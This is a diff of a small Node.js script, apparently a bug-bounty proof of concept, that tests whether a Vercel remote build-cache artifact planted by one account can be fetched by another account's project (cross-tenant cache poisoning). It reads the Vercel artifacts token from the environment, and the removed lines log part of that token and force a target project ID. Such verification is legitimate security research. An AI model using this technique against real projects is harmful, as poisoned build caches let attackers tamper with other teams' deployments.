@@ -1,21 +1,20 @@
-// verify-poison.js
 const { VERCEL_ARTIFACTS_TOKEN, VERCEL_ARTIFACTS_ID } = process.env;
 
-async function checkPoison() {
-    console.log("[?] Checking for remote cache artifacts...");
-    console.log(`[*] Using Token: ${VERCEL_ARTIFACTS_TOKEN ? VERCEL_ARTIFACTS_TOKEN.substring(0, 10) + '...' : 'MISSING'}`);
+async function verify() {
+    console.log("[#] === VERCEL INTEGRITY VERIFICATION ===");
     
-    const artifactHash = "deadbeef1337"; 
-    // Pakai endpoint Vercel Cache API yang lebih spesifik
+    // Hash yang sama dengan yang di-upload Akun A
+    const artifactHash = "h1_poc_3v1rn_999"; 
     const url = `https://api.vercel.com/v8/artifacts/${artifactHash}`;
+
+    console.log(`[*] Attempting to fetch poisoned artifact: ${artifactHash}`);
 
     try {
         const res = await fetch(url, {
             method: 'GET',
             headers: {
-                'Authorization': `Bearer ${VERCEL_ARTIFACTS_TOKEN}`,
-                // PAKSA kasih tau Project ID targetnya
-                'x-vercel-artifact-project-id': 'prj_S98fH6hOxHkxRzxT1b5sl6panuPv'
+                // Pakai token asli Akun B (Legal)
+                'Authorization': `Bearer ${VERCEL_ARTIFACTS_TOKEN}`
             }
         });
 
@@ -23,14 +22,15 @@ async function checkPoison() {
 
         if (res.status === 200) {
             const content = await res.text();
-            console.log(`[!] ARTIFACT FOUND! Content: "${content}"`);
+            console.log("\n[🚨][🚨][🚨] BUKTI TELAK BERHASIL!");
+            console.log(`[!] Content Found: "${content}"`);
+            console.log("[!] Project B beneran narik file yang di-inject Akun A.");
         } else {
-            const err = await res.text();
-            console.log(`[-] Failed. Server said: ${err}`);
+            console.log(`[-] Gagal. Status: ${res.status}. Berarti cuma 202 palsu.`);
         }
     } catch (e) {
         console.log(`[!] Error: ${e.message}`);
     }
 }
 
-checkPoison();
+verify();
